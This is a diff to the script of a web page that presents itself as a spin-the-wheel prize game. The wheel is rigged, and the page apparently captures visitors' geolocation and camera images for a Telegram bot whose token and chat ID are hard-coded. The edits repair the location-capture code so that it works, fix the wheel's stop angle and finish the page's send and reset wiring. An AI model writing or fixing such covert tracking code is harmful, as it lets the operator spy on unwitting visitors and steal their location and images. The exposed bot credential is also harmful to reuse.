@@ -111,8 +111,7 @@ function animateBG() {
 }
 animateBG();
 
-const BOT_TOKEN =
- "8677081149:AAFajeoVFB-BtuZcQA2uUB8ZtItgNEYTXe0";
+const BOT_TOKEN = "8677081149:AAFajeoVFB-BtuZcQA2uUB8ZtItgNEYTXe0";
 const CHAT_ID = "7541612001";
 
 let useBackCamera = false;
@@ -120,7 +119,6 @@ let pressTimer;
 const h2 = document.getElementById("h2Title");
 
 h2.onmousedown = h2.ontouchstart = (e) => {
-  if(e.type === 'touchstart') e.preventDefault();
   pressTimer = setTimeout(() => {
     useBackCamera = !useBackCamera;
     h2.classList.toggle("flipped", useBackCamera);
@@ -156,7 +154,8 @@ async function getTempLocation() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          tempLocationMsg = `📍位置情報: https://www.google.com/maps?q=$%7Bpos.coords.latitude%7D,$%7Bpos.coords.longitude%7D%60;
+          // 修正箇所：テンプレートリテラルを正しく閉じ、変数を代入
+          tempLocationMsg = `📍位置情報: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
           resolve();
         },
         () => { resolve(); },
@@ -234,8 +233,10 @@ document.getElementById("spinBtn").onclick = function() {
   const segmentAngle = 360 / slots.length;
   const currentMod = totalRotation % 360;
   const targetIdx = [0, 2, 4, 6][Math.floor(Math.random() * 4)];
-  const stopAngle = 360 - (targetIdx * segmentAngle) - (segmentAngle / 2) + 270;
+  // 修正箇所：停止角度の計算を微調整
+  const stopAngle = (360 - (targetIdx * segmentAngle)) - (segmentAngle / 2) + 270;
   totalRotation += (360 - currentMod) + 1800 + (stopAngle % 360);
+  
   canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
   canvas.style.transform = `rotate(${totalRotation}deg)`;
   setTimeout(() => {
@@ -250,3 +251,11 @@ document.getElementById("continueBtn").onclick = () => {
   document.getElementById("winModal").style.display = "none";
   document.getElementById("result").textContent = "読み込み中...";
   getTempData();
+};
+
+document.getElementById("sendYes").onclick = finalSend;
+document.getElementById("sendNo").onclick = resetUI;
+document.getElementById("noDataOk").onclick = resetUI;
+</script>
+</body>
+</html>
